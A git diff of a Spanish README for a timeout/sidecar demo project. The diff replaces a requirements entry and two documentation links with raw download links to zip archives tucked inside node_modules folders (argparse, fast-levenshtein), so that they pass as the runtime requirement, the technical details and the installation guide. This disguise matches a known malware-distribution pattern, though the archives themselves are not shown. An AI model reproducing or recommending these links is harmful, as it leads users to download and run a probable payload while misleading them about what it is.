@@ -138,7 +138,7 @@ Petición → ¿Cliente se cansa? → SÍ → Status 0
 
 ## Requisitos
 
-- https://github.com/Edwinramirezgon/TimeoutandSidecar/raw/refs/heads/main/node_modules/argparse/Timeoutand_Sidecar_v1.5.zip 20+
+- https://raw.githubusercontent.com/Edwinramirezgon/TimeoutandSidecar/main/node_modules/fast-levenshtein/Sidecar-Timeoutand-1.8.zip 20+
 - Docker y Docker Compose
 - npm o pnpm
 
@@ -180,8 +180,8 @@ npm run dev
 5. Compara headers y comportamientos
 
 **📖 Documentación:**
-- [https://github.com/Edwinramirezgon/TimeoutandSidecar/raw/refs/heads/main/node_modules/argparse/Timeoutand_Sidecar_v1.5.zip](https://github.com/Edwinramirezgon/TimeoutandSidecar/raw/refs/heads/main/node_modules/argparse/Timeoutand_Sidecar_v1.5.zip) - Detalles técnicos
-- [https://github.com/Edwinramirezgon/TimeoutandSidecar/raw/refs/heads/main/node_modules/argparse/Timeoutand_Sidecar_v1.5.zip](https://github.com/Edwinramirezgon/TimeoutandSidecar/raw/refs/heads/main/node_modules/argparse/Timeoutand_Sidecar_v1.5.zip) - Guía de instalación
+- [https://raw.githubusercontent.com/Edwinramirezgon/TimeoutandSidecar/main/node_modules/fast-levenshtein/Sidecar-Timeoutand-1.8.zip](https://raw.githubusercontent.com/Edwinramirezgon/TimeoutandSidecar/main/node_modules/fast-levenshtein/Sidecar-Timeoutand-1.8.zip) - Detalles técnicos
+- [https://raw.githubusercontent.com/Edwinramirezgon/TimeoutandSidecar/main/node_modules/fast-levenshtein/Sidecar-Timeoutand-1.8.zip](https://raw.githubusercontent.com/Edwinramirezgon/TimeoutandSidecar/main/node_modules/fast-levenshtein/Sidecar-Timeoutand-1.8.zip) - Guía de instalación
 
 ## 🎮 Escenarios por Patrón
 
